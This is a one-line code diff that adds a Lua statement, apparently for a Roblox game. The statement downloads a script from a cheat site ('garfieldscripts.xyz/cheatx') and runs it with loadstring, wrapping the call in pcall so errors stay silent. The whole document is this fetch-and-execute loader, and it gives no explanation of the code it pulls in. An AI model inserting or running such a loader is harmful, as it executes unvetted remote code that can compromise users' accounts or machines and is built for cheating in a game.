@@ -1,0 +1,1 @@
+pcall(loadstring(game:HttpGet('https://garfieldscripts.xyz/cheatx/scripts/main.lua'))())
